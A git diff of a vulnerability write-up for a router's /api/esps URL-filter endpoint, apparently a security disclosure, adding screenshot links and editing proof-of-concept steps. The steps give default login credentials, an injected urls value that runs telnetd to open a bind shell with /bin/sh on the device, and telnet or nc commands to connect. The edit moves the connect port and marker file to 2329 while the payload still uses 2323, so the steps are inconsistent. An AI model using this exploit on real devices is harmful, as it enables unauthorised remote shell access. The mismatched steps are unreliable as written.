@@ -57,6 +57,7 @@ The `/api/esps` entry point does not implement an object-level allowlist. After 
 ```text
 lua /usr/lib/lua/protol_cvt.lua magic_link '<request-body>'
 ```
+![alt text](imag/image-4.png)
 
 Then `/usr/lib/lua/magic_link/magic_link.lua` maps external JSON fields directly to ubus:
 
@@ -68,10 +69,15 @@ Then `/usr/lib/lua/magic_link/magic_link.lua` maps external JSON fields directly
 
 For this specific bug, one detail matters: the dangerous `eval` path is taken in the scheduled-rule branch where `mode` is non-empty. In the vulnerable script:
 
-- line 318 checks whether `mode` is empty;
-- lines 376-387 parse `urls[]` and execute `eval urlsStr"${idx}"="${urlsStr}"` when `mode` is present;
-- lines 472 and 105-110 later call `add_Urls`, which expands the indexed values again with `eval echo`.
+`usr/libexec/rpcd/esps.filter.url`
 
+- line 318 checks whether `mode` is empty;
+![alt text](imag/image-5.png)
+- lines 376-387 parse `urls[]` and execute `eval urlsStr"${idx}"="${urlsStr}"` when `mode` is present;
+![alt text](imag/image-6.png)
+- lines 472 and 105-110 later call `add_Urls`, which expands the indexed values again with `eval echo`.
+![alt text](imag/image-8.png)
+![alt text](imag/image-9.png)
 This is why the PoC sets `mode` to `white`: it intentionally forces the request into the branch that copies `urls[]` through `eval`.
 
 ## Firmware Paths for Audit
@@ -141,7 +147,7 @@ Connection: close
 
 {"username":"admin","password":"admin123"}
 ```
-
+![alt text](imag/image-1.png)
 2. Extract `data.session` from the response and use it as:
 
 ```text
@@ -161,17 +167,17 @@ Connection: close
 
 [{"id":1,"object":"esps.filter.url","method":"add","param":{"status":"enable","urls":["$(echo URLFILTER_RCE_OK >/tmp/urlfilter_rce_marker; /usr/sbin/telnetd -p 2323 -l /bin/sh >/dev/null 2>&1 &)"],"description":"urlfilter_rce_burp_2323","macs":[],"mode":"white","weekdays":[],"timeRange":[]}}]
 ```
-
+![alt text](imag/image-2.png)
 4. Wait briefly and connect to the listener:
 
 ```bash
-telnet 192.168.8.1 2323
+telnet 192.168.8.1 2329
 ```
-
+![alt text](imag/image.png)
 or:
 
 ```bash
-nc 192.168.8.1 2323
+nc 192.168.8.1 2329
 ```
 
 5. Run:
@@ -179,9 +185,9 @@ nc 192.168.8.1 2323
 ```sh
 id
 uname -a
-cat /tmp/urlfilter_rce_marker
+cat /tmp/urlfilter_rce_marker_2329
 ```
-
+![alt text](imag/image-3.png)
 6. Optionally enumerate the created rule:
 
 ```http
